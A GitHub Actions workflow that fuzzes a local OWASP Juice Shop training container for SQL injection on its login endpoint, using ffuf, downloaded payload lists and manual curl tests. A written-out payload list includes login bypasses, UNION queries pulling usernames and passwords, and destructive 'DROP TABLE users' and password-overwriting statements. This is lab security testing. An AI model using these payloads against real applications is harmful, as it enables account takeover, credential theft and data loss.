name: Juice Shop SQL Injection Fuzzing

on:
  push:
    branches: [ main ]
  workflow_dispatch:  # Для ручного запуска

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf-sql-injection:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Start Juice Shop container
        run: |
          # Запускаем Juice Shop без health check
          docker run -d \
            --name juice-shop \
            -p 3000:3000 \
            bkimminich/juice-shop:latest
          
          echo "Waiting for Juice Shop to start..."
          # Увеличиваем время ожидания и проверяем доступность
          for i in {1..30}; do
            if curl -s -f http://localhost:3000 > /dev/null; then
              echo "Juice Shop is up and running!"
              break
            fi
            echo "Waiting for Juice Shop to start... ($i/30)"
            sleep 2
          done
          
          # Финальная проверка
          if ! curl -s -f http://localhost:3000 > /dev/null; then
            echo "ERROR: Juice Shop failed to start"
            docker logs juice-shop
            exit 1
          fi
          
      - name: Install ffuf
        run: |
          # Устанавливаем ffuf
          wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
          tar -xzf ffuf_2.1.0_linux_amd64.tar.gz
          chmod +x ffuf
          sudo mv ffuf /usr/local/bin/
          
      - name: Download SQL injection payloads
        run: |
          # Скачиваем различные payloads для SQL injection
          mkdir -p payloads
          
          # Основные payloads для SQLite
          wget -O payloads/sqlite-payloads.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/SQLite.txt
          
          # Общие SQL injection payloads
          wget -O payloads/sql-general.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/detect.txt
          
          # Blind SQLi payloads
          wget -O payloads/blind-sqli.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/blind.txt
          
          # Создаем комбинированный файл
          cat payloads/*.txt > all-payloads.txt
          # Удаляем дубликаты
          sort -u all-payloads.txt > unique-payloads.txt
          
      - name: Prepare custom payloads for SQLite
        run: |
          # Создаем специфичные payloads для SQLite (Juice Shop использует SQLite)
          cat > payloads/custom-sqlite.txt << 'EOF'
          ' OR '1'='1
          ' OR 1=1--
          ' OR 1=1;--
          admin' OR '1'='1
          admin' OR 1=1--
          ' UNION SELECT null,null--
          ' UNION SELECT 1,2--
          ' UNION SELECT username,password FROM users--
          ' OR 1=1 LIMIT 1--
          '; SELECT SLEEP(5)--
          ' OR 1=1 AND (SELECT 1 FROM sqlite_master)--
          ' OR EXISTS(SELECT * FROM sqlite_master)--
          ' OR 1=1 AND (SELECT sql FROM sqlite_master WHERE type='table')--
          admin@juice-sh.op' OR '1'='1
          admin@juice-sh.op' OR 1=1--
          ' OR 'a'='a
          ' OR 'x'='x
          ' IS NULL;--
          '; DROP TABLE users;--
          '; UPDATE users SET password='hacked';--
          EOF
          
          # Добавляем кастомные payloads в общий список
          cat payloads/custom-sqlite.txt >> unique-payloads.txt
          sort -u unique-payloads.txt > unique-payloads-final.txt
          mv unique-payloads-final.txt unique-payloads.txt
          
      - name: Test login endpoint (baseline)
        run: |
          echo "Testing baseline login with invalid credentials..."
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"test@test.com","password":"test"}' \
            -o baseline-response.txt \
            -s -w "Status: %{http_code}\n"
          echo "Baseline response:"
          cat baseline-response.txt || true
          
      - name: Run ffuf fuzzing for SQL injection
        run: |
          echo "Starting SQL injection fuzzing on login endpoint..."
          echo "Total payloads to test: $(wc -l < unique-payloads.txt)"
          
          # Фаззинг параметра email - ищем отличные от 401 ответы
          echo "=== Fuzzing email parameter ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"FUZZ","password":"password"}' \
            -w unique-payloads.txt \
            -t 10 \
            -p 0.3 \
            -o ffuf-results-email.json \
            -of json \
            -fr "Invalid email or password" \
            -mc all \
            -v 2>&1 | tee ffuf-output-email.txt
            
          # Фаззинг параметра password
          echo -e "\n=== Fuzzing password parameter ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
            -w unique-payloads.txt \
            -t 10 \
            -p 0.3 \
            -o ffuf-results-password.json \
            -of json \
            -fr "Invalid email or password" \
            -mc all \
            -v 2>&1 | tee ffuf-output-password.txt
            
      - name: Analyze fuzzing results
        run: |
          echo "=== Analyzing fuzzing results ==="
          
          # Устанавливаем jq для анализа JSON
          sudo apt-get update && sudo apt-get install -y jq
          
          # Анализируем результаты для email
          if [ -f "ffuf-results-email.json" ]; then
            echo "Analyzing email fuzzing results..."
            # Ищем успешные ответы (не 401 и не 500)
            jq '.results[] | select(.status != 401 and .status != 500) | {input: .input.FUZZ, status: .status, length: .length}' ffuf-results-email.json > potential-hits-email.json || true
            
            if [ -s "potential-hits-email.json" ]; then
              echo "POTENTIAL SQL INJECTION FOUND IN EMAIL PARAMETER!"
              cat potential-hits-email.json
            else
              echo "No potential SQL injection found in email parameter"
            fi
          fi
          
          # Анализируем результаты для password
          if [ -f "ffuf-results-password.json" ]; then
            echo -e "\nAnalyzing password fuzzing results..."
            jq '.results[] | select(.status != 401 and .status != 500) | {input: .input.FUZZ, status: .status, length: .length}' ffuf-results-password.json > potential-hits-password.json || true
            
            if [ -s "potential-hits-password.json" ]; then
              echo "POTENTIAL SQL INJECTION FOUND IN PASSWORD PARAMETER!"
              cat potential-hits-password.json
            else
              echo "No potential SQL injection found in password parameter"
            fi
          fi
          
      - name: Manual SQL injection tests
        run: |
          echo "=== Running manual SQL injection tests ==="
          
          # Тест 1: Классическая SQL инъекция
          echo -e "\n1. Testing: ' OR '1'='1"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"'\'' OR '\''1'\''=''\''1","password":"anything"}' \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o /dev/null
          
          # Тест 2: Известный администратор Juice Shop
          echo -e "\n2. Testing: admin@juice-sh.op'--"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o /dev/null
          
          # Тест 3: С кавычкой и комментарием
          echo -e "\n3. Testing: admin@juice-sh.op' OR 1=1--"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"anything\"}" \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o /dev/null
          
          # Тест 4: Union-based
          echo -e "\n4. Testing: ' UNION SELECT null,null--"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"' UNION SELECT null,null--\",\"password\":\"anything\"}" \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o /dev/null
            
      - name: Get Juice Shop logs
        if: always()
        run: |
          echo "Getting Juice Shop logs..."
          docker logs juice-shop > juice-logs.log 2>&1 || true
          
      - name: Stop Juice Shop container
        if: always()
        run: |
          echo "Stopping Juice Shop container..."
          docker stop juice-shop 2>/dev/null || true
          docker rm juice-shop 2>/dev/null || true
          
      - name: Upload fuzzing results as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sql-injection-results
          path: |
            ffuf-results-*.json
            ffuf-output-*.txt
            potential-hits-*.json
            baseline-response.txt
            juice-logs.log
            unique-payloads.txt
          retention-days: 7
          
      - name: Create summary report
        if: always()
        run: |
          echo "Creating summary report..."
          
          # Считаем общее количество payloads
          total_payloads=$(wc -l < unique-payloads.txt 2>/dev/null || echo "0")
          
          cat > summary-report.md << EOF
          # SQL Injection Fuzzing Report - Juice Shop
          
          ## Test Details
          - Application: OWASP Juice Shop
          - Target: /rest/user/login
          - Test Date: $(date)
          - Total Payloads Tested: $total_payloads
          
          ## Results Summary
          EOF
          
          # Проверяем найденные уязвимости
          if [ -f "potential-hits-email.json" ] && [ -s "potential-hits-email.json" ]; then
            echo -e "\n## ⚠️ POTENTIAL SQL INJECTIONS FOUND IN EMAIL PARAMETER!" >> summary-report.md
            echo '```json' >> summary-report.md
            cat potential-hits-email.json >> summary-report.md
            echo '```' >> summary-report.md
          else
            echo -e "\n## ✅ No SQL injections found in email parameter" >> summary-report.md
          fi
          
          if [ -f "potential-hits-password.json" ] && [ -s "potential-hits-password.json" ]; then
            echo -e "\n## ⚠️ POTENTIAL SQL INJECTIONS FOUND IN PASSWORD PARAMETER!" >> summary-report.md
            echo '```json' >> summary-report.md
            cat potential-hits-password.json >> summary-report.md
            echo '```' >> summary-report.md
          else
            echo -e "\n## ✅ No SQL injections found in password parameter" >> summary-report.md
          fi
          
          echo -e "\n## Manual Test Results" >> summary-report.md
          echo "Manual tests were executed with common SQL injection payloads." >> summary-report.md
          echo "Check the workflow logs for detailed response codes." >> summary-report.md
          
          echo -e "\n## Next Steps" >> summary-report.md
          echo "1. Review the full fuzzing results in the artifacts" >> summary-report.md
          echo "2. Check Juice Shop logs for any error messages" >> summary-report.md
          echo "3. Try additional payloads or fuzzing techniques" >> summary-report.md
          
      - name: Upload summary report
        uses: actions/upload-artifact@v4
        with:
          name: summary-report
          path: summary-report.md
